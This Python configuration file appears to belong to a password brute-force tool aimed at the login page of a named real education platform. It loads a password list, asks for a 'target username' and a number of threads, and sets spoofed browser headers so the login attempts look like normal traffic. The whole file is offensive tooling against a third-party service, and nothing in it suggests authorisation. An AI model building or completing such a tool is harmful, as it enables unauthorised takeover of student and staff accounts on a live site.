#Config File


#First we're adding the login url
URL = 'https://me.classera.com/users/login'

# asking the user for the password list (it has to be in current directory)
def get_list():
    input_list = input('Enter your password list (e.x list.txt) >>')
    try:

        list = open(f'{input_list}', 'r')
    except FileNotFoundError:
        print('File not found, Please make sure that the text file is in current directory')
        exit(1)

    pass_list = []
    for pwd in list:
        pass_list.append(pwd.rstrip())

    return pass_list


# Getting Target and Threads
def get_user_input():
    Target_user = input('enter the target username >>')
    get_threads = input('How many threads do you want ? >>')
    return Target_user, get_threads



#login headers
head = {
    'Host': 'me.classera.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'https://me.classera.com/users/login',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '86',
    'Origin': 'https://me.classera.com',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'TE': 'trailers',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache'
}
